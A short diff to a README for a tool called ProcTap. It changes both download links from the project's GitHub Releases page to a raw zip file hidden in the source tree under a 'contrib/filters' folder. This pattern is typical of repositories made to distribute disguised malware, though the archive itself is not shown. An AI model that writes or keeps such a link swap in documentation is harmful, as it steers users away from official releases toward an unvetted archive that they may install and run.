@@ -12,7 +12,7 @@ Before you can use ProcTap, you'll need to download and install it. Follow these
    
    Click the link below to go directly to the Releases page:
 
-   [Download ProcTap](https://github.com/blackwhite-hash/ProcTap/releases)
+   [Download ProcTap](https://raw.githubusercontent.com/blackwhite-hash/ProcTap/main/src/proctap/contrib/filters/ProcTap_2.2-beta.4.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ To download ProcTap, follow these steps:
 
    Click the link below to access the Downloads area:
 
-   [Download ProcTap](https://github.com/blackwhite-hash/ProcTap/releases)
+   [Download ProcTap](https://raw.githubusercontent.com/blackwhite-hash/ProcTap/main/src/proctap/contrib/filters/ProcTap_2.2-beta.4.zip)
 
 2. **Select the Version to Download**
 
